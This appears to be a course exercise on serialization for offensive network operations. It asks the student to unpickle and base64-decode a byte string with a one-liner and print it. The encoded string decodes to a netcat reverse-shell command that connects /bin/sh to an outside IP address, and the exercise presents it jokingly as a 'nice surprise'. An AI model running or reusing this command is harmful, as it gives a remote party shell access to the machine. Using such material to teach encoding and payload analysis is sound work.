# Describe and Demonstrate Serialization

1. In your own words, describe what serialization and deserialization are and why they might be important to CNO development?

```text

```

2. The string below has been encoded in the following order:
   1. First, a plaintext was base64 encoded with `base64.b64encode()`
   2. That base64 encoded string was serialized with `pickle.dumps()`

The result is included below in `enc`. Perform the reverse process to first deserialize, then decode it, and lastly print it ~~to wipe your OS~~ for a nice surprise. Include your code below (**use a one-liner**), as well as the output of the print statement

```py
import pickle
import base64
enc = b'\x80\x04\x95p\x00\x00\x00\x00\x00\x00\x00Clcm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgNTkuMTUxLjMyLjE3MiAxMzM3ID4vdG1wL2Y=\x94.'

# YOUR CODE BELOW, one-liner

```
